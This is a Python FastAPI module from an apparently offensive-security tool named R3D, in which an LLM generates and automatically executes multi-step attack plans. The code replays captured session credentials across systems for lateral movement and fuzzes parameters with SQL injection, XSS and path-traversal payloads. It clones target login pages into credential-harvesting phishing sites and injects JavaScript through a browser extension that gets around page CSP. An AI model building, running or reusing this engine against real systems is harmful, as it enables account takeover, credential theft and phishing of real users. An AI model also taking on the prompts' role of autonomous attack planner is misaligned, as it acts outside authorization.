"""AI attack planner — generate multi-step plans and execute them.

Also includes the credential pivot engine.
"""

import asyncio
import json
from urllib.parse import urlparse

import litellm
from fastapi import APIRouter, Depends, HTTPException, Request
from fastapi.responses import JSONResponse
from pydantic import BaseModel

from core.auth import verify_api_key
from core.config import DEFAULT_MODEL, now
from core.db import get_sessions_col
from core.opsec import throttle
from core.replay import get_http_client
from core.sse import broadcast
from core.vault import CredentialVault
from core import state

router = APIRouter(prefix="/r3d/attack", tags=["plans"])

# ─── Request Models ──────────────────────────────────────────────────


class PivotRequest(BaseModel):
    maxAttempts: int = 20
    targetSystems: list[str] | None = None


class PlanGenerateRequest(BaseModel):
    maxSteps: int = 10


class PlanExecuteRequest(BaseModel):
    planId: str
    stopOnFailure: bool = True


# ─── Helpers ─────────────────────────────────────────────────────────


def _update_graph_edges(graph_doc: dict, pivot_results: list):
    """Update graph edges based on pivot results."""
    edges = graph_doc.get("edges", [])
    nodes = graph_doc.get("nodes", [])
    node_ids_by_domain: dict[str, str] = {}
    for n in nodes:
        if n.get("type") == "system":
            for d in n.get("domains", []):
                node_ids_by_domain[d] = n["id"]

    for r in pivot_results:
        target_domain = r.get("target", "")
        source_origin = r.get("source", "")
        source_domain = ""
        try:
            source_domain = urlparse(source_origin).hostname or ""
        except Exception:
            pass

        source_node = node_ids_by_domain.get(source_domain)
        target_node = node_ids_by_domain.get(target_domain)
        if not source_node or not target_node or source_node == target_node:
            continue

        existing = next((e for e in edges if e["from"] == source_node and e["to"] == target_node), None)
        if r["verdict"] == "confirmed":
            if existing:
                existing["confidence"] = "confirmed"
                existing["label"] = "credential replay: confirmed"
            else:
                edges.append({
                    "from": source_node, "to": target_node,
                    "label": "credential replay: confirmed",
                    "confidence": "confirmed",
                })
        elif r["verdict"] == "rejected" and existing and existing.get("confidence") == "hypothesis":
            existing["confidence"] = "rejected"

    graph_doc["edges"] = edges


# ─── Endpoints ───────────────────────────────────────────────────────


@router.post("/pivot/{sid}", dependencies=[Depends(verify_api_key)])
async def attack_pivot(sid: str, body: PivotRequest, request: Request):
    """AI-targeted credential replay across systems to confirm lateral movement."""
    g_col = request.app.state.graphs_col
    if g_col is None:
        raise HTTPException(status_code=503, detail="MongoDB not configured")
    graph_doc = await g_col.find_one({"_id": f"graph-{sid}"})
    if not graph_doc:
        raise HTTPException(status_code=404, detail="Build the attack graph first")

    nodes = graph_doc.get("nodes", [])
    edges = graph_doc.get("edges", [])
    system_nodes = [n for n in nodes if n.get("type") == "system"]
    if not system_nodes:
        return {"ok": True, "results": [], "message": "No system nodes in graph"}

    vault: CredentialVault = request.app.state.credential_vault
    origins_meta = await vault.list_origins()
    cred_origins = {}
    for meta in origins_meta:
        if meta.get("hasCookies") or meta.get("headerKeys"):
            ctx = await vault.get_context(meta["origin"])
            cred_origins[meta["origin"]] = {k: v for k, v in ctx.items() if k != "ts"}

    if not cred_origins:
        return {"ok": True, "results": [], "message": "No captured credentials available"}

    system_summary = json.dumps([{"id": n["id"], "name": n.get("name", ""), "domains": n.get("domains", [])}
                                  for n in system_nodes], default=str)
    cred_summary = json.dumps([{"origin": o, "hasCookies": bool(c.get("cookies")),
                                 "headerKeys": list((c.get("headers") or {}).keys())}
                                for o, c in cred_origins.items()], default=str)
    edge_summary = json.dumps(edges[:60], default=str)

    prompt = (
        "You are R3D. Plan lateral movement tests for this engagement.\n\n"
        f"SYSTEMS IN GRAPH:\n{system_summary}\n\n"
        f"CAPTURED CREDENTIALS (by origin):\n{cred_summary}\n\n"
        f"EXISTING GRAPH EDGES:\n{edge_summary}\n\n"
        "Analyze which credentials from one system might grant access to ANOTHER system. "
        "Consider shared SSO providers, cookie domains, JWT issuers, and auth header patterns.\n\n"
        "Return valid JSON with key \"pivots\" — an array of objects, each with:\n"
        '  "sourceOrigin" — origin whose credentials to replay\n'
        '  "targetDomain" — domain of the target system to test against\n'
        '  "targetPaths" — array of 2-4 URL paths to probe (e.g. "/api/me", "/", "/api/v1/user")\n'
        '  "reasoning" — why this pivot might work\n'
        '  "priority" — integer 1-10 (10 = most likely to succeed)\n\n'
        f"Return at most {body.maxAttempts} pivots, ordered by priority descending. "
        "Only suggest pivots where sourceOrigin differs from targetDomain's origin."
    )

    try:
        ai_response = await litellm.acompletion(
            model=DEFAULT_MODEL,
            messages=[
                {"role": "system", "content": "You are R3D, an offensive security intelligence system."},
                {"role": "user", "content": prompt},
            ],
            response_format={"type": "json_object"},
        )
        ai_plan = json.loads(ai_response.choices[0].message.content or "{}")
    except Exception as e:
        return JSONResponse(status_code=502, content={"error": f"AI pivot planning failed: {e}"})

    pivots = (ai_plan.get("pivots") or [])[:body.maxAttempts]
    if not pivots:
        return {"ok": True, "results": [], "message": "AI found no promising pivots"}

    results: list[dict] = []
    confirmed_count = 0

    async def _run_pivots():
        nonlocal confirmed_count
        for i, pivot in enumerate(pivots):
            await throttle()
            source_origin = pivot.get("sourceOrigin", "")
            target_domain = pivot.get("targetDomain", "")
            target_paths = pivot.get("targetPaths", ["/"])
            reasoning = pivot.get("reasoning", "")

            if not source_origin or not target_domain:
                continue

            replay_headers = await vault.get_replay_headers(source_origin, {})
            if not replay_headers:
                results.append({"source": source_origin, "target": target_domain,
                                "status": "skipped", "reason": "No credentials for source origin"})
                continue

            best_result = None
            for path in target_paths[:4]:
                target_url = f"https://{target_domain}{path}"
                try:
                    async with get_http_client(timeout=10, follow_redirects=True) as client:
                        resp = await client.get(target_url, headers=replay_headers)
                    is_authed = resp.status_code < 400 and resp.status_code != 301 and resp.status_code != 302
                    body_preview = resp.text[:500] if is_authed else ""
                    attempt = {
                        "url": target_url, "status": resp.status_code,
                        "authenticated": is_authed, "bodyPreview": body_preview,
                    }
                    if best_result is None or (is_authed and not best_result.get("authenticated")):
                        best_result = attempt
                    if is_authed:
                        break
                except Exception as exc:
                    best_result = best_result or {"url": target_url, "status": 0, "error": str(exc), "authenticated": False}

            verdict = "confirmed" if best_result and best_result.get("authenticated") else "rejected"
            if verdict == "confirmed":
                confirmed_count += 1

            entry = {
                "index": i, "source": source_origin, "target": target_domain,
                "reasoning": reasoning, "verdict": verdict, "probe": best_result,
            }
            results.append(entry)
            broadcast("pivot_progress", {"sessionId": sid, "index": i,
                                          "total": len(pivots), "entry": entry})

        _update_graph_edges(graph_doc, results)
        graph_doc["pivotResults"] = results
        graph_doc["pivotedAt"] = now().isoformat()
        if g_col is not None:
            await g_col.replace_one({"_id": graph_doc["_id"]}, graph_doc, upsert=True)

        broadcast("pivot_complete", {
            "sessionId": sid, "total": len(results),
            "confirmed": confirmed_count,
            "rejected": len(results) - confirmed_count,
        })

    await _run_pivots()

    graph_doc["id"] = graph_doc.pop("_id", f"graph-{sid}")
    return {"ok": True, "results": results, "confirmed": confirmed_count,
            "rejected": len(results) - confirmed_count, "graph": graph_doc}


@router.post("/plan/{sid}", dependencies=[Depends(verify_api_key)])
async def generate_attack_plan(sid: str, body: PlanGenerateRequest, request: Request):
    """AI generates a multi-step attack plan from session data + graph."""
    col = get_sessions_col(request)
    session = await col.find_one({"_id": sid})
    if not session:
        raise HTTPException(status_code=404, detail="Session not found")

    g_col = request.app.state.graphs_col
    graph_doc = None
    if g_col is not None:
        graph_doc = await g_col.find_one({"_id": f"graph-{sid}"})

    findings = [e.get("data", {}) for e in session.get("events", []) if e.get("type") == "finding"]
    systems: dict[str, dict] = {}
    for e in session.get("events", []):
        if e.get("type") == "request" and e.get("data", {}).get("systemId"):
            d = e["data"]
            sid_sys = d["systemId"]
            if sid_sys not in systems:
                systems[sid_sys] = {"id": sid_sys, "name": d.get("systemName", sid_sys), "urls": set()}
            try:
                systems[sid_sys]["urls"].add(urlparse(d.get("url", "")).path)
            except Exception:
                pass

    systems_list = [{"id": s["id"], "name": s["name"], "samplePaths": list(s["urls"])[:10]} for s in systems.values()]

    vault: CredentialVault = request.app.state.credential_vault
    cred_summary = await vault.list_origins()

    findings_summary = json.dumps([{
        "id": f.get("id", ""), "title": f.get("title", ""), "severity": f.get("severity", ""),
        "systemId": f.get("systemId", ""), "status": f.get("status", ""),
        "cwe": f.get("cwe", ""),
    } for f in findings[:30]], default=str)

    graph_summary = ""
    pivot_summary = ""
    if graph_doc:
        graph_summary = json.dumps({
            "nodes": graph_doc.get("nodes", [])[:30],
            "edges": graph_doc.get("edges", [])[:50],
            "paths": graph_doc.get("paths", [])[:10],
        }, default=str)
        pivot_results = graph_doc.get("pivotResults", [])
        if pivot_results:
            pivot_summary = json.dumps(pivot_results, default=str)

    prompt = (
        "You are R3D. Generate a multi-step attack plan "
        "that chains vulnerabilities across systems for maximum impact.\n\n"
        f"SYSTEMS OBSERVED:\n{json.dumps(systems_list, default=str)}\n\n"
        f"FINDINGS ({len(findings)} total, top 30):\n{findings_summary}\n\n"
        f"AVAILABLE CREDENTIALS:\n{json.dumps(cred_summary, default=str)}\n\n"
        + (f"ATTACK GRAPH:\n{graph_summary}\n\n" if graph_summary else "")
        + (f"CONFIRMED PIVOT RESULTS:\n{pivot_summary}\n\n" if pivot_summary else "")
        + 'Each step is one of these types (prefer templated types over browser):\n'
        '- "server": Single HTTP request with replayed auth credentials. '
        'Provide {method, url, sourceOrigin, body}.\n'
        '- "scan": Batch-probe multiple endpoints in parallel. '
        'Provide {probes: [{url, method}], useAuthContext}. '
        'The proxy fires all probes server-side with captured session credentials '
        'and reports status/body for each. '
        'USE THIS instead of browser steps that loop over endpoints.\n'
        '- "fuzz": Parameter fuzzing with built-in payload libraries. '
        'Provide {fuzzConfig: {url, method, paramPositions: [{name, position, original}], '
        'payloadSets: ["sqli","xss","ssrf","idor","path-traversal","command-injection"], maxRequests}}. '
        'The proxy mutates each parameter position with the payload library and reports anomalies. '
        'USE THIS instead of browser steps that iterate payloads.\n'
        '- "pivot": Credential replay across systems to test lateral movement. '
        'Provide {pivotConfig: {sourceOrigin, targetDomain, targetPaths: ["/api/me", "/"]}}. '
        'The proxy replays cookies/headers from sourceOrigin against targetDomain '
        'and reports which paths return authenticated responses. '
        'USE THIS for lateral movement testing.\n'
        '- "phish": Clone a target login page as a credential-harvesting phish site. '
        'Provide {phishTarget}. The proxy clones the page with captured auth context, '
        'injects credential capture hooks (form, password blur, fetch/XHR, MutationObserver, '
        'cookie/storage snapshot), and serves it. Zero JS needed. '
        'Output is the victim-facing serve URL.\n'
        '- "browser": JavaScript snippet injected into the target page via Chrome extension '
        '(MAIN world). ONLY use this when you genuinely need DOM access '
        '(read localStorage, document.cookie, inspect rendered page content). '
        'For HTTP requests use server. For batch probing use scan. '
        'For fuzzing use fuzz. For lateral movement use pivot. '
        'For credential harvesting use phish. '
        'Use console.log("[R3D TEST] ...") for all output.\n\n'
        "CSP-SAFE PROXY RELAY (browser steps only):\n"
        "The target page's CSP BLOCKS fetch() to arbitrary origins. Browser snippets MUST use "
        "window.__r3d_proxy(endpoint, body) instead of fetch() to reach the proxy. This relay "
        "routes through the Chrome extension's service worker which bypasses page CSP.\n"
        "  await window.__r3d_proxy('r3d/test/beacon', {data: 'proof'})\n"
        "  await window.__r3d_proxy('r3d/attack/fetch', {url, method, headers, body})\n"
        "  await window.__r3d_proxy('r3d/attack/validate-token', {accessToken, userinfoUrl, headers})\n"
        "NEVER use fetch() to reach the proxy in browser snippets. ALWAYS use window.__r3d_proxy().\n\n"
        "RULES:\n"
        "- NEVER use browser steps for HTTP requests, scanning, fuzzing, or credential replay. "
        "Use server/scan/fuzz/pivot instead — they are fixed templates with zero error surface.\n"
        "- browser steps are ONLY for DOM access: reading localStorage, document.cookie, "
        "inspecting rendered page content, or interacting with page elements.\n"
        "- Earlier steps can extract data that later steps use. "
        "Reference prior step output with {{step.N.output}} placeholders.\n"
        "- Use phish steps when the objective involves credential harvesting or social engineering.\n"
        "- Each step MUST have clear success/failure criteria.\n"
        f"- Maximum {body.maxSteps} steps. Prioritize by impact.\n\n"
        "Return valid JSON with these keys:\n"
        '"name" — short attack plan title\n'
        '"summary" — 2-3 sentence description of the attack chain\n'
        '"steps" — array of objects, each with:\n'
        '  "index" — step number (0-based)\n'
        '  "type" — "server", "scan", "fuzz", "pivot", "phish", or "browser"\n'
        '  "target" — full URL or origin\n'
        '  "objective" — what this step proves or extracts\n'
        '  "request" — (server only) {method, url, sourceOrigin, body}\n'
        '  "probes" — (scan only) [{url, method}] array of endpoints to probe\n'
        '  "useAuthContext" — (scan/fuzz) inject captured session credentials, default true\n'
        '  "fuzzConfig" — (fuzz only) {url, method, paramPositions: [{name, position, original}], payloadSets, maxRequests}\n'
        '  "pivotConfig" — (pivot only) {sourceOrigin, targetDomain, targetPaths}\n'
        '  "phishTarget" — (phish only) full URL to clone as credential-harvesting page\n'
        '  "snippet" — (browser only) JavaScript to inject\n'
        '  "successCriteria" — string describing what output means success\n'
        '  "feedsInto" — array of step indexes that depend on this step\'s output\n'
    )

    try:
        response = await litellm.acompletion(
            model=DEFAULT_MODEL,
            messages=[
                {"role": "system", "content": "You are R3D, an offensive security intelligence system generating executable attack plans."},
                {"role": "user", "content": prompt},
            ],
            response_format={"type": "json_object"},
        )
        plan = json.loads(response.choices[0].message.content or "{}")
    except Exception as e:
        return JSONResponse(status_code=502, content={"error": f"AI plan generation failed: {e}"})

    plan_id = f"plan_{sid[:8]}_{now().strftime('%H%M%S')}"
    plan["planId"] = plan_id
    plan["sessionId"] = sid
    plan["status"] = "generated"
    plan["generatedAt"] = now().isoformat()
    state.active_plans[plan_id] = plan

    return {"ok": True, "plan": plan}


@router.post("/plan/{sid}/execute", dependencies=[Depends(verify_api_key)])
async def execute_attack_plan(sid: str, body: PlanExecuteRequest, request: Request):
    """Execute a generated attack plan step by step."""
    plan = state.active_plans.get(body.planId)
    if not plan:
        raise HTTPException(status_code=404, detail="Plan not found — generate one first")

    steps = plan.get("steps", [])
    if not steps:
        return {"ok": True, "results": [], "message": "Plan has no steps"}

    plan["status"] = "executing"
    step_outputs: dict[int, str] = {}
    step_results: list[dict] = []

    async def _execute():
        for step in steps:
            await throttle()
            idx = step.get("index", len(step_results))
            step_type = step.get("type", "server")
            target = step.get("target", "")
            objective = step.get("objective", "")
            success_criteria = step.get("successCriteria", "")

            broadcast("plan_step_start", {
                "planId": body.planId, "sessionId": sid,
                "index": idx, "type": step_type, "target": target, "objective": objective,
            })

            resolved_snippet = step.get("snippet", "")
            resolved_request = step.get("request", {})
            for prev_idx, prev_output in step_outputs.items():
                placeholder = "{{step." + str(prev_idx) + ".output}}"
                safe_output = (prev_output or "").replace("\\", "\\\\").replace("'", "\\'").replace('"', '\\"').strip()
                if resolved_snippet:
                    resolved_snippet = resolved_snippet.replace(placeholder, safe_output)
                if isinstance(resolved_request.get("url"), str):
                    resolved_request["url"] = resolved_request["url"].replace(placeholder, safe_output)
                if isinstance(resolved_request.get("body"), str):
                    resolved_request["body"] = resolved_request["body"].replace(placeholder, safe_output)
                for probe in step.get("probes", []):
                    if isinstance(probe.get("url"), str):
                        probe["url"] = probe["url"].replace(placeholder, safe_output)
                fuzz_cfg = step.get("fuzzConfig", {})
                if isinstance(fuzz_cfg.get("url"), str):
                    fuzz_cfg["url"] = fuzz_cfg["url"].replace(placeholder, safe_output)
                for pp in fuzz_cfg.get("paramPositions", []):
                    if isinstance(pp.get("original"), str):
                        pp["original"] = pp["original"].replace(placeholder, safe_output)
                pivot_cfg = step.get("pivotConfig", {})
                if isinstance(pivot_cfg.get("sourceOrigin"), str):
                    pivot_cfg["sourceOrigin"] = pivot_cfg["sourceOrigin"].replace(placeholder, safe_output)
                if isinstance(pivot_cfg.get("targetDomain"), str):
                    pivot_cfg["targetDomain"] = pivot_cfg["targetDomain"].replace(placeholder, safe_output)
                phish_target = step.get("phishTarget", "")
                if isinstance(phish_target, str) and placeholder in phish_target:
                    step["phishTarget"] = phish_target.replace(placeholder, safe_output)

            result = {"index": idx, "type": step_type, "target": target, "objective": objective}

            if step_type == "browser":
                test_id = f"plan_{body.planId}_step{idx}"
                state.pending_tests[test_id] = {
                    "testId": test_id, "snippet": resolved_snippet,
                    "findingTitle": f"Attack Plan Step {idx}", "findingId": "",
                    "sessionId": sid, "targetOrigin": target,
                    "status": "queued", "ts": now().isoformat(),
                }
                state.test_log[test_id] = state.pending_tests[test_id].copy()
                broadcast("run_test", state.pending_tests[test_id])

                for _ in range(30):
                    await asyncio.sleep(1)
                    log_entry = state.test_log.get(test_id, {})
                    if log_entry.get("status") == "completed":
                        test_result = log_entry.get("result", {})
                        result["output"] = test_result.get("output", "")
                        result["error"] = test_result.get("error")
                        result["status"] = test_result.get("verdict", "inconclusive")
                        break
                else:
                    result["output"] = ""
                    result["error"] = "Timed out waiting for extension to execute"
                    result["status"] = "timeout"

            elif step_type == "phish":
                from uuid import uuid4
                from routers.phish import PHISH_CACHE_ROOT, _clone_page

                phish_url = step.get("phishTarget") or target
                try:
                    p = urlparse(phish_url)
                    phish_origin = f"{p.scheme}://{p.netloc}"
                except Exception:
                    phish_origin = ""

                vault: CredentialVault = request.app.state.credential_vault
                replay_headers = await vault.get_replay_headers(phish_origin, {})
                phish_site_id = uuid4().hex[:8]
                cache_dir = PHISH_CACHE_ROOT / phish_site_id
                assets_dir = cache_dir / "assets"
                assets_dir.mkdir(parents=True, exist_ok=True)

                try:
                    info = await _clone_page(
                        phish_url, phish_origin, replay_headers,
                        phish_site_id, cache_dir, assets_dir,
                    )
                    serve_url = f"/p/{phish_site_id}/"
                    state.phish_sites[phish_site_id] = {
                        "siteId": phish_site_id,
                        "targetUrl": phish_url,
                        "targetOrigin": phish_origin,
                        "clonedAt": now().isoformat(),
                        "assetsCloned": info["assetsCloned"],
                        "formsDetected": info["formsDetected"],
                        "captured": [],
                    }
                    result["output"] = serve_url
                    result["status"] = "success"
                    result["phishSiteId"] = phish_site_id
                    result["assetsCloned"] = info["assetsCloned"]
                    result["formsDetected"] = info["formsDetected"]

                    broadcast("phish_cloned", {
                        "siteId": phish_site_id,
                        "targetUrl": phish_url,
                        "serveUrl": serve_url,
                        "assetsCloned": info["assetsCloned"],
                        "formsDetected": info["formsDetected"],
                    })
                except Exception as exc:
                    import shutil
                    shutil.rmtree(cache_dir, ignore_errors=True)
                    result["output"] = ""
                    result["error"] = str(exc)
                    result["status"] = "error"

            elif step_type == "scan":
                probes = step.get("probes", [])
                use_auth = step.get("useAuthContext", True)
                if not probes:
                    probes = [{"url": target, "method": "GET"}]
                scan_results: list[dict] = []
                for probe in probes[:50]:
                    await throttle()
                    probe_url = probe.get("url", target)
                    probe_method = probe.get("method", "GET")
                    try:
                        p = urlparse(probe_url)
                        origin = f"{p.scheme}://{p.netloc}"
                    except Exception:
                        origin = ""
                    headers = await vault.get_replay_headers(origin, {}) if use_auth else {}
                    try:
                        async with get_http_client(timeout=10, follow_redirects=True) as client:
                            resp = await client.request(method=probe_method, url=probe_url, headers=headers)
                        scan_results.append({
                            "url": probe_url, "method": probe_method,
                            "status": resp.status_code, "bodySize": len(resp.text),
                            "bodyPreview": resp.text[:500],
                        })
                    except Exception as exc:
                        scan_results.append({"url": probe_url, "method": probe_method, "error": str(exc)})

                hits = [r for r in scan_results if r.get("status", 0) < 400 and r.get("bodySize", 0) > 50]
                result["output"] = json.dumps({"total": len(scan_results), "hits": len(hits), "results": scan_results}, default=str)
                result["status"] = "success"
                result["scanResults"] = scan_results

            elif step_type == "fuzz":
                from core.replay import payloads as payload_lib

                fuzz_cfg = step.get("fuzzConfig", {})
                fuzz_url = fuzz_cfg.get("url", target)
                fuzz_method = fuzz_cfg.get("method", "GET")
                param_positions = fuzz_cfg.get("paramPositions", [])
                payload_sets = fuzz_cfg.get("payloadSets", [])
                max_requests = min(fuzz_cfg.get("maxRequests", 50), 100)
                use_auth = fuzz_cfg.get("useAuthContext", True)

                all_payloads: list[str] = []
                for ps in payload_sets:
                    all_payloads.extend(payload_lib.get(ps, []))
                if not all_payloads:
                    all_payloads = ["' OR 1=1--", "<script>alert(1)</script>", "{{7*7}}", "../etc/passwd"]

                try:
                    p = urlparse(fuzz_url)
                    fuzz_origin = f"{p.scheme}://{p.netloc}"
                except Exception:
                    fuzz_origin = ""
                base_headers = await vault.get_replay_headers(fuzz_origin, {}) if use_auth else {}

                baseline_body = ""
                baseline_status = 0
                try:
                    async with get_http_client(timeout=10, follow_redirects=True) as client:
                        baseline_resp = await client.request(method=fuzz_method, url=fuzz_url, headers=base_headers)
                    baseline_status = baseline_resp.status_code
                    baseline_body = baseline_resp.text
                except Exception:
                    pass

                fuzz_results: list[dict] = []
                anomalies: list[dict] = []
                req_count = 0
                for payload in all_payloads[:max_requests]:
                    await throttle()
                    req_count += 1
                    mutated_url = fuzz_url
                    for pp in param_positions:
                        orig = pp.get("original", "")
                        if orig and orig in mutated_url:
                            mutated_url = mutated_url.replace(orig, payload, 1)
                    try:
                        async with get_http_client(timeout=10, follow_redirects=True) as client:
                            resp = await client.request(method=fuzz_method, url=mutated_url, headers=base_headers)
                        entry = {
                            "payload": payload[:100], "url": mutated_url,
                            "status": resp.status_code, "bodySize": len(resp.text),
                        }
                        is_anomaly = (
                            resp.status_code != baseline_status
                            or abs(len(resp.text) - len(baseline_body)) > max(100, len(baseline_body) * 0.2)
                        )
                        if is_anomaly:
                            entry["bodyPreview"] = resp.text[:300]
                            entry["anomaly"] = True
                            anomalies.append(entry)
                        fuzz_results.append(entry)
                    except Exception as exc:
                        fuzz_results.append({"payload": payload[:100], "url": mutated_url, "error": str(exc)})

                result["output"] = json.dumps({
                    "totalRequests": req_count, "anomalies": len(anomalies),
                    "topAnomalies": anomalies[:10], "baselineStatus": baseline_status,
                }, default=str)
                result["status"] = "success" if anomalies else "success"
                result["fuzzResults"] = {"total": req_count, "anomalies": anomalies}

            elif step_type == "pivot":
                pivot_cfg = step.get("pivotConfig", {})
                source_origin = pivot_cfg.get("sourceOrigin", "")
                target_domain = pivot_cfg.get("targetDomain", "")
                target_paths = pivot_cfg.get("targetPaths", ["/"])

                if not source_origin or not target_domain:
                    result["output"] = ""
                    result["error"] = "pivotConfig requires sourceOrigin and targetDomain"
                    result["status"] = "error"
                else:
                    replay_headers = await vault.get_replay_headers(source_origin, {})
                    pivot_results: list[dict] = []
                    for path in target_paths[:10]:
                        await throttle()
                        probe_url = f"https://{target_domain}{path}"
                        try:
                            async with get_http_client(timeout=10, follow_redirects=True) as client:
                                resp = await client.get(probe_url, headers=replay_headers)
                            is_authed = resp.status_code < 400 and resp.status_code not in (301, 302)
                            pivot_results.append({
                                "url": probe_url, "status": resp.status_code,
                                "authenticated": is_authed,
                                "bodyPreview": resp.text[:500] if is_authed else "",
                            })
                        except Exception as exc:
                            pivot_results.append({"url": probe_url, "error": str(exc), "authenticated": False})

                    confirmed = [r for r in pivot_results if r.get("authenticated")]
                    result["output"] = json.dumps({
                        "confirmed": len(confirmed), "total": len(pivot_results),
                        "results": pivot_results,
                    }, default=str)
                    result["status"] = "success" if confirmed else "failed"
                    result["pivotResults"] = pivot_results

            else:
                req = resolved_request
                method = req.get("method", "GET")
                url = req.get("url", target)
                source_origin = req.get("sourceOrigin", "")
                req_body = req.get("body")

                origin_for_creds = source_origin
                if not origin_for_creds:
                    try:
                        p = urlparse(url)
                        origin_for_creds = f"{p.scheme}://{p.netloc}"
                    except Exception:
                        pass

                headers = await vault.get_replay_headers(origin_for_creds, {})
                try:
                    async with get_http_client(timeout=12, follow_redirects=True) as client:
                        resp = await client.request(
                            method=method, url=url, headers=headers,
                            content=req_body.encode() if req_body else None,
                        )
                    result["httpStatus"] = resp.status_code
                    result["output"] = resp.text[:2000]
                    result["responseHeaders"] = {k: v for k, v in resp.headers.items()
                                                  if k.lower() in ("content-type", "location", "set-cookie",
                                                                    "www-authenticate", "x-request-id")}
                    result["status"] = "success" if resp.status_code < 400 else "failed"
                except Exception as exc:
                    result["output"] = ""
                    result["error"] = str(exc)
                    result["status"] = "error"

            output_text = result.get("output", "")
            passed = False
            if success_criteria and output_text:
                criteria_lower = success_criteria.lower()
                if "status 200" in criteria_lower and result.get("httpStatus") == 200:
                    passed = True
                if any(kw in output_text.lower() for kw in success_criteria.lower().split(" and ") if len(kw) > 3):
                    passed = True
                if "contains" in criteria_lower:
                    check_val = criteria_lower.split("contains")[-1].strip().strip('"').strip("'")
                    if check_val and check_val in output_text.lower():
                        passed = True
            elif result.get("status") == "success":
                passed = True

            result["passed"] = passed
            step_outputs[idx] = output_text
            step_results.append(result)

            broadcast("plan_step_complete", {
                "planId": body.planId, "sessionId": sid,
                "index": idx, "result": result,
            })

            if not passed and body.stopOnFailure:
                break

        passed_count = sum(1 for r in step_results if r.get("passed"))
        plan["status"] = "complete"
        plan["results"] = step_results
        plan["completedAt"] = now().isoformat()

        verdict_prompt = (
            f"You executed a {len(step_results)}-step attack plan. "
            f"{passed_count}/{len(step_results)} steps succeeded.\n\n"
            f"Plan: {plan.get('name', '')}\n"
            f"Results: {json.dumps(step_results, default=str)}\n\n"
            "Return valid JSON with:\n"
            '"verdict" — CRITICAL, HIGH, MEDIUM, LOW, or INCONCLUSIVE\n'
            '"summary" — 2-3 sentence executive summary of what was proven\n'
            '"provenRisks" — array of specific risks demonstrated\n'
            '"recommendations" — array of remediation steps'
        )
        try:
            vr = await litellm.acompletion(
                model=DEFAULT_MODEL,
                messages=[
                    {"role": "system", "content": "You are R3D. Summarize these attack plan execution results."},
                    {"role": "user", "content": verdict_prompt},
                ],
                response_format={"type": "json_object"},
            )
            plan["verdict"] = json.loads(vr.choices[0].message.content or "{}")
        except Exception:
            plan["verdict"] = {"verdict": "INCONCLUSIVE", "summary": f"{passed_count}/{len(step_results)} steps succeeded."}

        session_col = get_sessions_col(request)
        if session_col is not None:
            try:
                artifact = {
                    "type": "attack_plan_result",
                    "ts": int(now().timestamp() * 1000),
                    "data": {
                        "planId": body.planId, "name": plan.get("name", ""),
                        "stepsTotal": len(step_results), "stepsPassed": passed_count,
                        "verdict": plan["verdict"],
                    },
                }
                await session_col.update_one(
                    {"_id": sid},
                    {"$push": {"events": artifact}, "$inc": {"eventCount": 1}},
                )
            except Exception:
                pass

        broadcast("plan_complete", {
            "planId": body.planId, "sessionId": sid,
            "stepsTotal": len(step_results), "stepsPassed": passed_count,
            "verdict": plan.get("verdict", {}),
        })

    asyncio.create_task(_execute())
    return {"ok": True, "planId": body.planId, "stepsTotal": len(steps), "status": "executing"}
